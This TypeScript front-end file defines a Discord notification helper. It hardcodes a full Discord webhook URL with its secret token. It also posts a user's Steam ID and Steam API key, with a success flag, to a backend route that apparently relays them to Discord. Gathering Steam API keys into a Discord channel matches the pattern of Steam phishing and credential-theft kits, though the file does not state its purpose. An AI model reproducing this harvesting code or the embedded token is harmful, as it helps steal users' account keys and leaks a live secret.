const API_BASE_URL = 'http://localhost:3002';

export const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1384653570854621305/DdVWxMKLCHWkPb5vXlBBs473AK3DrOaCpGhSjLhOz4UqMr4QZWYDTrBdHBrJ8lcBeqKF';

interface DiscordWebhookMessage {
  content?: string;
  embeds?: Array<{
    title?: string;
    description?: string;
    color?: number;
    fields?: Array<{
      name: string;
      value: string;
      inline?: boolean;
    }>;
    timestamp?: string;
  }>;
}

export const sendDiscordNotification = async (steamId: string, success: boolean, apiKey?: string, error?: string) => {
  try {
    const response = await fetch(`${API_BASE_URL}/api/discord/notify`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        steamId,
        success,
        apiKey,
        error
      }),
      credentials: 'include'
    });

    if (!response.ok) {
      throw new Error('Failed to send Discord notification');
    }
  } catch (error) {
    console.error('Error sending Discord notification:', error);
  }
}; 